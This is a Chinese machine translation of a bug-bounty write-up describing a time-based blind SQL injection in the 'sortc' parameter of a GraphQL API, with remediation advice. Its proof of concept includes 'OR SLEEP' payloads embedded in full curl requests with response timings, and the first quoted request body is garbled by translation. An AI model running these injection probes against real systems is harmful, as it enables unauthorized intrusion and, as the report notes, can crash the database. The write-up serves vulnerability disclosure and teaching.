# GraphQL 中基于时间的盲 SQL 注入

> 原文：<https://infosecwriteups.com/time-based-blind-sql-injection-in-graphql-39a25a1dfb3c?source=collection_archive---------0----------------------->

我听说过很多关于 GraphQL 的事情，但是由于时间限制，我一直没有时间去了解它。最近拿到了一个用 GraphQL 中的 API 进行 pentest 的应用。经过一段时间的测试，我能够找到基于时间的盲人 SQL 注入。我们将假设网站为 http://example.com

# **总结**

[http://example.com/api/graphql](http://example.com/api/graphql)端点中的" *sortc"* 参数易受 SQL 注入攻击。这使得攻击者能够从公共和安全的模式中提取信息。

可能还有其他易受 **SQL 注入影响的参数。**

# **影响**

盲 SQL 注入的工作方式是执行基于时间的查询，然后在给定时间后返回结果，表明 SQL 查询执行成功。利用这种方法，攻击者可以列举出使用了哪个模式或者使用了哪个数据库。

然后，攻击者试图确定他的查询何时返回真或假，然后他可以在 RDBMS 上采集指纹。这将使整个攻击变得容易得多。如果使用基于时间的方法，这有助于确定正在使用的数据库类型。另一种流行的方法是调用返回当前日期的函数。MySQL、MSSQL 和 Oracle 对此有不同的函数，分别是 *now()* 、 *getdate()* 和 *sysdate()* 。

# **概念验证**

1)登录网站。

2)拦截以下请求:[http://example.com/api/graphql](http://example.com/api/graphql)

3)在请求正文中，在 sortc 中添加“*或 SLEEP(20)”*

> 请求:
> 
> {"operationName":"pages "，" variables":{"offset":0，" limit":10，" **sortc** ":" **name** ，" sortrev":false}，" query":"query pages($offset: Int！，$limit: Int！，$sortc: String，$ sortrev:Boolean){ \ n pages(offset:＄offset，limit:＄limit，sortc:＄sort column，sort reverse:＄sort reverse){ \ n id \ n \ n \ n _ _ typen \ n } \ n me { \ n first n \ n lastN \ n usernn \ n _ _ typen \ n } \ n components { \ n title \ n _ _ typen \ n } \ n templates { \ n title \ n _ _ typen \ n \ n } \ n 字体{ \ n \ n \ n _ _ typen \ n \ n } \ n 合作伙伴{ \ n id \ n \ n

4)等待一段时间，检查服务器响应的延迟

5)在这种情况下，数据库随后崩溃。所以我没有进一步列举就报告了漏洞。

**通过卷曲:**

1)运行 curl 命令并检查响应时间，睡眠(2):

```
time curl -i -s -k  -X $'POST' \
    -H $'Host: example.com' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://example.com/dashboard' -H $'content-type: application/json' -H $'Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c' -H $'Origin: http://example.com' -H $'Content-Length: 662' -H $'DNT: 1' -H $'Connection: close' \
    --data-binary $'{"operationName":"pages","variables":{"offset":0,"limit":10,"sortc":"name **OR SLEEP(2)**","sortrev":false},"query":"query pages($offset: Int!, $limit: Int!, $sortc: String, $sortrev: Boolean) {\n  pages(offset: $offset, limit: $limit, sortc: $sortColumn, sortReverse: $sortReverse) {\n    id\n    n\n    __typen\n  }\n  me {\n    firstN\n    lastN\n    usern\n    __typen\n  }\n  components {\n    title\n    __typen\n  }\n  templates {\n    title\n    __typen\n  }\n  fonts {\n    n\n    __typen\n  }\n  partners {\n    id\n    n\n    banners {\n      n\n      __typen\n    }\n    __typen\n  }\n}\n"}' \
    $'http://example.com/api/graphql'
```

响应时间:

*   真正的 0m4.191s
*   用户 0m0.006s
*   sys 0m0.011s

2)运行 curl 命令并检查响应时间，睡眠(10):

```
time curl -i -s -k  -X $'POST' \
    -H $'Host: example.com' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://example.com/dashboard' -H $'content-type: application/json' -H $'Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c' -H $'Origin: http://example.com' -H $'Content-Length: 663' -H $'DNT: 1' -H $'Connection: close' \
    --data-binary $'{"operationName":"pages","variables":{"offset":0,"limit":10,"sortc":"name **OR SLEEP(10)**","sortrev":false},"query":"query pages($offset: Int!, $limit: Int!, $sortc: String, $sortrev: Boolean) {\n  pages(offset: $offset, limit: $limit, sortc: $sortColumn, sortReverse: $sortReverse) {\n    id\n    n\n    __typen\n  }\n  me {\n    firstN\n    lastN\n    usern\n    __typen\n  }\n  components {\n    title\n    __typen\n  }\n  templates {\n    title\n    __typen\n  }\n  fonts {\n    n\n    __typen\n  }\n  partners {\n    id\n    n\n    banners {\n      n\n      __typen\n    }\n    __typen\n  }\n}\n"}' \
    $'http://example.com/api/graphql'
```

响应时间:

*   真实 0m20.220s
*   用户 0m0.006s
*   sys 0m0.006s

# **变通解决方案**

*   使用预处理语句(带参数化查询)
*   存储过程的使用。
*   白名单输入验证。
*   转义所有用户提供的输入
*   **实施最低特权**

# **参考**

[https://medium . com/@ localh0t/discovering-graph QL-endpoints-and-sqli-vulnerability-5d 39 f 26 ce a2e](https://medium.com/@localh0t/discovering-graphql-endpoints-and-sqli-vulnerabilities-5d39f26cea2e)

[https://hackerone.com/reports/435066](https://hackerone.com/reports/435066)

[https://cheatsheetseries . owasp . org/Cheat sheets/SQL _ Injection _ Prevention _ Cheat _ sheet . html](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

[![](img/4bc5de35955c00939383a18fb66b41d8.png)](https://www.buymeacoffee.com/justmorpheus)

*关注* [*Infosec 报道*](https://medium.com/bugbountywriteup) *获取更多此类精彩报道。*

[](https://medium.com/bugbountywriteup) [## 信息安全报道

### 收集了世界上最好的黑客的文章，主题从 bug 奖金和 CTF 到 vulnhub…

medium.com](https://medium.com/bugbountywriteup)